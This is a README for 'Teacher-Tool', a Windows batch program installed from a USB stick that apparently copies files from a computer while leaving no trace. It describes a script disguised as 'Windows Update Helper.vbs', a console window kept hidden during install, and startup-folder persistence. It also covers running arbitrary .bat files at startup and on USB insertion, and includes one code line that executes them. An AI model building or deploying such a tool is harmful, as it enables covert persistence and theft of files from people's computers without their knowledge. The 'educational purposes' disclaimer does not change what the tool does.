# Teacher-Tool

Batch program created to enable quick copying with "0" traceback 

# How to install and use

to install, you need "Windows Update Helper.vbs", lmao.bat and lmao69.dat on the *root* of the usb and launch lmao.bat (since 4.0-debug only lmao.bat)

Installation takes around 3 seconds, however most of this time, the cmd is invisible

after install you only need lmao69.dat with "initcopy" inside (without quotes)

# File Options

novbs.dat -> enables "Debug" mode meaning that you can see the cmd window (OPTIONAL)

dontcopy.dat -> disables copying (OPTIONAL)

UNIN000.dat -> uninstalls the "tool" (OPTIONAL)

atinsert.dat -> adds programs to be executed at usb insertion (only .bat) (OPTIONAL)

atstartup.dat -> adds programs to be executed at startup (only .bat) (OPTIONAL)

code for handling these (since 3.5 filtering to only launch .bat):
`if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a"))`

transfer.dat -> copy files to hdd upon usb insert; D:\transfer\Desktop\idk.docx => C:\Windows\Users\USERNAME\Desktop\idk.docx (OPTIONAL)

lmao69.dat -> file responsible for detecting the usb. needs "initcopy" or .bat filename inside (gets executed) to work (ESSENTIAL)
If you want to rename lmao69.dat, the first line in lmao.bat needs to be changed to `set filename=YOUR_FILENAME`


force_dat.dat -> if the program doesn't check the file for some reason (i.e. the check for file of initcopy is disabled), this forces the check (OPTIONAL)

# 2 additional modules

I have also added 2 additional .bat files that help with certain stuff. First one is uninstallexts.dat, which is used to delete all extra apps installed by atstartup or atinsert

and alwaysinit.bat which skips the lmao69.dat check (to check for .bat or initcopy)

# NOTE

at insert and at startup date change CRASHES THE APP if the folders are empty! (since 3.7_updated bug removed)
## Current version: 4.1 (4.0_nobugs)
### Current Debug Version: -
I am not responsible for any problems that may arise while using this tool
Only for educational purposes
